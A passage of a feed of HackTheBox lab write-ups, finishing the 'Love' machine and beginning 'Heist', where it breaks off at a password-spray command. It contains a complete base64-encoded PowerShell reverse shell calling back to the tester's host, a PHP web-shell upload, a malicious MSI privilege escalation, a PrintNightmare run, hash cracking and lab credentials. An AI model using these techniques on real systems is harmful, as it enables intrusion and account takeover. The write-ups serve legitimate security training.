<p>Now if I submit <code>file:///C:/xampp/htdocs/passwordmanager/creds.txt</code>, it returns the following:</p>
<p><div class="img-container"><img src="imgs/image-20210809034943436.png" alt="image-20210809034943436"  /></div>
</p>
<p>Alternatively, I can just visit <code>http://127.0.0.1:5000/</code> and the file scanner will render the page of password manager, in which contains the admin credentials.</p>
<p><div class="img-container"><img src="imgs/image-20210809033828889.png" alt="image-20210809033828889"  /></div>
</p>
<p>I can use that creds to access the admin dashboard.</p>
<p><div class="img-container"><img src="imgs/image-20210809034300363.png" alt="image-20210809034300363"  /></div>
</p>
<h4 id="php-webshell">PHP webshell</h4>
<p>On  <code>admin/voters.php</code>, there is a photo upload feature.</p>
<p><div class="img-container"><img src="imgs/image-20210809035502402.png" alt="image-20210809035502402"  /></div>
</p>
<p>I will intercept the request to modify the photo section to a PHP web shell and then send it afterwards. It gets uploaded smoothly.</p>
<p><div class="img-container"><img src="imgs/image-20210809040225250.png" alt="image-20210809040225250"  /></div>
</p>
<p>When I reload the page, I see the voter I added is there with broken photo, and that because it loads my PHP web shell as image.</p>
<p><div class="img-container"><img src="imgs/image-20210809041027772.png" alt="image-20210809041027772"  /></div>
</p>
<p>The uploaded web shell is accessible at  <code>http://www.love.htb/images/shell.php</code>, and now I have code execution as <strong>phoebe</strong>.</p>
<p><div class="img-container"><img src="imgs/image-20210809040810276.png" alt="image-20210809040810276"  /></div>
</p>
<h4 id="interactive-shell-access">Interactive shell access</h4>
<p>To get an interactive shell I will use a PowerShell one-liner reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ cat exploits/revshell.ps1
</span></span><span class="line"><span class="cl"><span class="nv">$client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s1">&#39;10.10.14.51&#39;</span>,53<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte<span class="o">[]]</span><span class="nv">$bytes</span> <span class="o">=</span> 0..65535<span class="p">|</span>%<span class="o">{</span>0<span class="o">}</span><span class="p">;</span><span class="k">while</span><span class="o">((</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>, 0, <span class="nv">$bytes</span>.Length<span class="o">))</span> -ne 0<span class="o">){</span><span class="p">;</span><span class="nv">$data</span> <span class="o">=</span> <span class="o">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> Out-String <span class="o">)</span><span class="p">;</span><span class="nv">$sendback2</span> <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s1">&#39;PS &#39;</span> + <span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>.Path + <span class="s1">&#39;&gt; &#39;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding<span class="o">]</span>::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span>
</span></span></code></pre></div><p>Because it is a Windows machine, I will encoded it with base64 to avoid AV.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ cat exploits/revshell.ps1<span class="p">|</span> iconv -t UTF-16LE<span class="p">|</span> base64 -w0
</span></span><span class="line"><span class="cl"><span class="nv">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANQAxACcALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA</span><span class="o">=</span>
</span></span></code></pre></div><p>I will setup a listener and leverage the web shell to execute my payload.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">http://www.love.htb/images/shell.php?f<span class="o">=</span>powershell.exe -enc <span class="nv">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANQAxACcALAA1ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA</span><span class="o">=</span>
</span></span></code></pre></div><p>On my listener.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ rlwrap nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.51<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.239<span class="o">]</span> <span class="m">49950</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\o</span>mrs<span class="se">\i</span>mages&gt;
</span></span></code></pre></div><p>The user flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop&gt; dir
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name                                                                 
</span></span><span class="line"><span class="cl">----                 -------------         ------ ----                                                                 
</span></span><span class="line"><span class="cl">-ar---          8/8/2021   3:50 AM             <span class="m">34</span> user.txt                                                             
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>esktop&gt; <span class="nb">type</span> user.txt
</span></span><span class="line"><span class="cl">65a5...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The flag also accessible using SSRF.</p>
<p><div class="img-container"><img src="imgs/image-20210809043334065.png" alt="image-20210809043334065"  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-system">Shell as SYSTEM</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>WinPEAS finds that <code>AlwaysInstallElevated</code> is set to 1. This means installation of an app always runs in elevated mode (SYSTEM), and it can be abused to install a malicious <code>.msi</code> package.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[+] Checking AlwaysInstallElevated
</span></span><span class="line"><span class="cl">   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
</span></span><span class="line"><span class="cl">    AlwaysInstallElevated set to 1 in HKLM!
</span></span><span class="line"><span class="cl">    AlwaysInstallElevated set to 1 in HKCU!
</span></span></code></pre></div><h4 id="exploitation---malicious-msi-installer">Exploitation - Malicious .msi Installer</h4>
<p>I will generate a malicious <code>.msi</code> that will add a user with administrative access using <code>msfvenom</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ msfvenom -p windows/adduser <span class="nv">USER</span><span class="o">=</span>iamf <span class="nv">PASS</span><span class="o">=</span>P@ssword123! -f msi -o iamf.msi
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x86 from the payload
</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
</span></span><span class="line"><span class="cl">Payload size: <span class="m">270</span> bytes
</span></span><span class="line"><span class="cl">Final size of msi file: <span class="m">159744</span> bytes
</span></span><span class="line"><span class="cl">Saved as: iamf.msi
</span></span></code></pre></div><p>I will host the <code>.msi</code> using Python web server.</p>
<p>On Love, I will grab the msi and install the package immediately.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; curl.exe -O 10.10.14.53/iamf.msi
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; msiexec /quiet /qn /i iamf.msi
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; net user
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User accounts <span class="k">for</span> <span class="se">\\</span>LOVE                                                                                                                                                   
</span></span><span class="line"><span class="cl">                                                                                                                                                                           
</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------                                                                                            
</span></span><span class="line"><span class="cl">Administrator            DefaultAccount           Guest                                                                                                                    
</span></span><span class="line"><span class="cl">iamf                     Phoebe                   WDAGUtilityAccount                                                                                                       
</span></span><span class="line"><span class="cl">The <span class="nb">command</span> completed successfully.                                                                                                                                        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; 
</span></span></code></pre></div><h4 id="psexec---system">Psexec - SYSTEM</h4>
<p>I can login using my backdoor user with help of <code>psexec.py</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ psexec.py love/iamf:<span class="s1">&#39;P@ssword123!&#39;</span>@10.10.10.239                                            
</span></span><span class="line"><span class="cl">Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting shares on 10.10.10.239.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploading file VlzRTIEE.exe
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Opening SVCManager on 10.10.10.239.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Creating service lRbn on 10.10.10.239.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting service lRbn.....
</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.19042.867<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2020</span> Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;hostname
</span></span><span class="line"><span class="cl">love
</span></span></code></pre></div><h4 id="alternative-printnightmare">(Alternative) PrintNightmare</h4>
<p>Love also vulnerable to LPE <a href="https://github.com/calebstewart/CVE-2021-1675">PrintNightmare</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; Get-Service -name spooler
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Status   Name               DisplayName
</span></span><span class="line"><span class="cl">------   ----               -----------
</span></span><span class="line"><span class="cl">Running  spooler            Print Spooler
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; curl.exe -O 10.10.14.51/CVE-2021-1675.ps1
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; Import-Module .<span class="se">\C</span>VE-2021-1675.ps1
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; Invoke-Nightmare
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="se">\D</span>ownloads&gt; net user
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User accounts <span class="k">for</span> <span class="se">\\</span>LOVE
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">adm1n                    Administrator            DefaultAccount           
</span></span><span class="line"><span class="cl">Guest                    iamf                     Phoebe                   
</span></span><span class="line"><span class="cl">WDAGUtilityAccount       
</span></span><span class="line"><span class="cl">The <span class="nb">command</span> completed successfully.
</span></span></code></pre></div><p>I can login via WinRM.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ evil-winrm -i 10.10.10.239 -u <span class="s1">&#39;adm1n&#39;</span> -p<span class="s1">&#39;P@ssw0rd&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v2.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\a</span>dm1n<span class="se">\D</span>ocuments&gt; hostname
</span></span><span class="line"><span class="cl">Love
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Heist</title>
      <link>https://fahmifj.github.io/hackthebox/heist/</link>
      <pubDate>Wed, 28 Jul 2021 04:05:19 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/heist/</guid>
      <description>Learn how RID cycling could be used for enumerating AD users</description>
      <content:encoded><![CDATA[<p>Heist features a Help Desk-like system that allows a visitor to login as guest. Guest access allows me to read the ongoing issue and obtain an attached Cisco configuration file which contains usernames and passwords. With these credentials, a RID brute-force attack is performed in order to obtain more usernames. Spraying these credentials returns an account that can be used for remote login into the system. The administrator password can be obtained from Firefox memory dump.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Password spray attack</li>
<li>Username enumeration via RPC using RID brute-force.</li>
<li>Process dump</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>CrackMapExec</li>
<li>Hashcat</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan using <code>nmap</code> discovers five open ports: an IIS Web server on port 80, MS-RPC on port 135 and port 49669, SMB on port 445, WinRM on port 5985.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ nmap -p- -oA nmap/10-tcp-allport-heist 10.10.10.149
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-11 21:43 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.149
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.069s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65530</span> filtered ports
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE
</span></span><span class="line"><span class="cl">80/tcp    open  http
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds
</span></span><span class="line"><span class="cl">5985/tcp  open  wsman
</span></span><span class="line"><span class="cl">49669/tcp open  unknown
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 148.82 seconds
</span></span><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ nmap -p80,135,445,5985,49669 -sC -sV -oA nmap/10-tcp-allport-script-heist 10.10.10.149
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-11 21:46 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.149
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.061s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
</span></span><span class="line"><span class="cl">80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-cookie-flags: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   /: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>     PHPSESSID: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_      httponly flag not <span class="nb">set</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-title: Support Login Page
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Requested resource was login.php
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">49669/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: 2m52s
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2021-07-12T01:50:42
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 99.94 seconds
</span></span></code></pre></div><p>I probably won&rsquo;t touch MS-RPC on port 49669, but the one on port 135 is worth checking to detect PrintNightmare (which I already did in <a href="https://fahmifj.github.io/blog/play-with-printnightmare/">this post</a>).</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Without credentials, I can&rsquo;t do much on SMB.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.10.149
</span></span><span class="line"><span class="cl">session setup failed: NT_STATUS_ACCESS_DENIED
</span></span></code></pre></div><h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting the website on port 80 presented with a login page.</p>
<p><div class="img-container"><img src="imgs/image-20210712085020304.png" alt="image-20210712085020304"  /></div>
</p>
<p>No register button was found here, so I clicked the guest login and it brought me to the following page.</p>
<p><div class="img-container"><img src="imgs/image-20210712085409456.png" alt="image-20210712085409456"  /></div>
</p>
<p>From the chat above, user Hazard attached his Cisco configuration in a text file, and this config file contains several credentials.</p>
<p><div class="img-container"><img src="imgs/image-20210712085452329.png" alt="image-20210712085452329"  /></div>
</p>
<p>I know this is not my business, but it looks like this part messed up his router 😅.</p>
<p><div class="img-container"><img src="imgs/image-20210726174927930.png" alt="image-20210726174927930"  /></div>
</p>
<p>So anyway, I will grab these credentials and also I will note that hazard asked the admin to create an account for accessing the files, which probably the SMB share.</p>
<h3 id="password-crack">Password Crack</h3>
<p>The first password can be recovered with <code>hashcat</code> (identified as md5crypt).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./hashcat.exe -m <span class="m">500</span> hashes/heist-cisco.hash ../../rockyou.txt -O
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$1$pdQG$o8nrSzsGXeaduXrjlvKc91</span>:stealth1agent
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Session..........: hashcat
</span></span><span class="line"><span class="cl">Status...........: Cracked
</span></span><span class="line"><span class="cl">Hash.Name........: md5crypt, MD5 <span class="o">(</span>Unix<span class="o">)</span>, Cisco-IOS <span class="nv">$1</span>$ <span class="o">(</span>MD5<span class="o">)</span>
</span></span><span class="line"><span class="cl">Hash.Target......: <span class="nv">$1$pdQG$o8nrSzsGXeaduXrjlvKc91</span>
</span></span><span class="line"><span class="cl">Time.Started.....: Mon Jul <span class="m">12</span> 08:58:28 <span class="m">2021</span> <span class="o">(</span><span class="m">2</span> secs<span class="o">)</span>
</span></span><span class="line"><span class="cl">Time.Estimated...: Mon Jul <span class="m">12</span> 08:58:30 <span class="m">2021</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
</span></span><span class="line"><span class="cl">Guess.Base.......: File <span class="o">(</span>../../rockyou.txt<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The rest of the passwords are encrypted with cisco type 7 encryption. These passwords can be decrypted using <a href="https://davidbombal.com/cisco-type-7-password-decryption/">this site</a> .</p>
<p><div class="img-container"><img src="imgs/image-20210712090727149.png" alt="image-20210712090727149"  /></div>
</p>
<p><div class="img-container"><img src="imgs/image-20210712090628350.png" alt="image-20210712090628350"  /></div>
</p>
<p>Now I have one password and two set of credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">?:$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
</span></span><span class="line"><span class="cl">rout3r:0242114B0E143F015F5D1E161713:$uperP@ssword
</span></span><span class="line"><span class="cl">admin:02375012182C1A1D751618034F36415408:Q4)sJu\Y8qz*A3?d
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="access-as-hazard">Access as Hazard</h3>
<h4 id="password-spray">Password Spray</h4>
<p>With user <code>hazard</code> included, I have three usernames and three passwords. I will use them to perform a password spray attack on SMB using <code>crackmapexec</code>. The results reveals that the password <code>stealth1agent</code>  works for user <code>hazard</code>, but it doesn&rsquo;t show &ldquo;Pwn3d!&rdquo; message, this means I have no access to WinRM.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «heist» «10.10.14.83» 
</span></span><span class="line"><span class="cl">$ crackmapexec smb 10.10.10.149 -u usernames.list -p passwords.list
